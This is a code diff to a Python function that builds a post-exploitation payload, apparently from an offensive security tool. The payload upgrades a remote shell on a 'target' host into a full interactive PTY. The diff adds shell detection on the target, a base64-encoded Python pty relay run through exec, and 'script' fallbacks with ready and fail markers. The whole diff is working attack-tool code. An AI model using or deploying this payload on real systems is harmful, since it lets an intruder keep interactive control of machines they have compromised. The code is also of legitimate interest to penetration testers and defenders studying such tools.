@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import asyncio
+import base64
 import re
 import secrets
 import shlex
@@ -122,37 +123,88 @@ def pty_upgrade_payload(
     will emit once it's through the upgrade. Returns (payload, ready_marker).
 
     Strategy, in order of preference on the target:
-      1. python3  - always best, pty.spawn proxies the socket ↔ pty master
-      2. python   - same as above for Python 2 hosts
-      3. script   - uses OS-appropriate syntax:
+      1. python3  - pty.fork() + execv(shell), VERIFIED: the child must outlive
+                    the exec or we emit the fail marker. Then proxy socket ↔ pty.
+      2. python   - same relay for Python 2 hosts
+      3. script   - OS-appropriate syntax, `|| echo <fail>` on error:
                     Darwin/BSD:  script -q /dev/null <shell>
-                    Linux:       script -qc <shell> /dev/null
+                    Linux:       script -qc "<shell> -i" /dev/null
       4. none     - emits a clearly marked failure message
 
-    After the upgrade, a second line runs stty + TERM + a sentinel echo inside
-    the new PTY — if we see the sentinel come back, the upgrade worked.
+    The shell is resolved on-target to one that exists (operator choice / $SHELL,
+    then bash, then sh) — never hard-coded — so bash-less hosts (Alpine, busybox
+    containers) still upgrade. After spawning, a second line runs stty + TERM + a
+    sentinel echo inside the new PTY; seeing the sentinel confirms the upgrade.
+    The fail marker is checked first, so a failed spawn can't masquerade as ready.
     """
     ready = f"@@PW_PTY_READY_{secrets.token_hex(4)}@@"
     fail = f"@@PW_PTY_FAIL_{secrets.token_hex(4)}@@"
 
-    if not shell:
-        shell_expr = 'S="${SHELL:-/bin/bash}"'
+    # Resolve a shell that ACTUALLY EXISTS on the target. The old payload
+    # hard-coded /bin/bash (via an un-exported var), so it blew up on bash-less
+    # hosts like Alpine. Prefer the operator's choice / $SHELL, then bash, then
+    # sh — exported as $PWSH so the Python relay below can read it.
+    if shell:
+        shell_resolve = f"PWSH={shlex.quote(shell)}"
     else:
-        shell_expr = f'S={shlex.quote(shell)}'
+        shell_resolve = 'PWSH="${SHELL:-}"'
+    shell_resolve += (
+        '; [ -x "$PWSH" ] || PWSH="$(command -v bash 2>/dev/null)"'
+        '; [ -x "$PWSH" ] || PWSH="$(command -v sh 2>/dev/null)"'
+        "; export PWSH"
+    )
+
+    # Python relay: fork a real PTY, exec the shell, and VERIFY the child
+    # survived the exec before declaring success. On failure it emits the fail
+    # marker (honest result) instead of silently leaving a half-broken shell;
+    # on success it proxies socket <-> pty master until the shell exits. Shipped
+    # base64-encoded so the multi-line body needs no shell-quoting gymnastics.
+    relay = (
+        "import pty,os,time,select\n"
+        "pid,fd=pty.fork()\n"
+        "if pid==0:\n"
+        "    sh=os.environ.get('PWSH') or '/bin/sh'\n"
+        "    try:\n"
+        "        os.execv(sh,[sh,'-i'])\n"
+        "    except Exception:\n"
+        "        os._exit(127)\n"
+        "else:\n"
+        "    time.sleep(0.2)\n"
+        "    if os.waitpid(pid,os.WNOHANG)[0]:\n"
+        f"        os.write(1,b'{fail}')\n"
+        "        os._exit(1)\n"
+        "    while 1:\n"
+        "        try:\n"
+        "            r=select.select([0,fd],[],[])[0]\n"
+        "        except Exception:\n"
+        "            break\n"
+        "        if 0 in r:\n"
+        "            d=os.read(0,65536)\n"
+        "            if not d: break\n"
+        "            os.write(fd,d)\n"
+        "        if fd in r:\n"
+        "            try:\n"
+        "                d=os.read(fd,65536)\n"
+        "            except OSError:\n"
+        "                break\n"
+        "            if not d: break\n"
+        "            os.write(1,d)\n"
+    )
+    b64 = base64.b64encode(relay.encode()).decode()
+    py = f'import base64;exec(base64.b64decode(\\"{b64}\\"))'
 
     spawn = (
-        f"{shell_expr}; "
+        f"{shell_resolve}; "
         "if command -v python3 >/dev/null 2>&1; then "
-        'python3 -c "import pty,os,sys;pty.spawn([os.environ.get(\\"S\\",\\"/bin/bash\\"),\\"-i\\"])" 2>/dev/null '
-        '|| python3 -c "import pty;pty.spawn([\\"$S\\",\\"-i\\"])"; '
+        f'python3 -c "{py}" 2>/dev/null; '
         "elif command -v python >/dev/null 2>&1; then "
-        'python -c "import pty;pty.spawn([\\"$S\\",\\"-i\\"])"; '
+        f'python -c "{py}" 2>/dev/null; '
         "elif command -v script >/dev/null 2>&1; then "
         '  U="$(uname 2>/dev/null)"; '
         '  if [ "$U" = Darwin ] || [ "$U" = FreeBSD ] || [ "$U" = OpenBSD ] || [ "$U" = NetBSD ]; then '
-        '    script -q /dev/null "$S"; '
+        f'    script -q /dev/null "$PWSH" || echo {fail}; '
         "  else "
-        '    script -qc "$S -i" /dev/null; '
+        f'    script -qc "$PWSH -i" /dev/null || echo {fail}; '
         "  fi; "
         "else "
         f'  echo {fail}; '
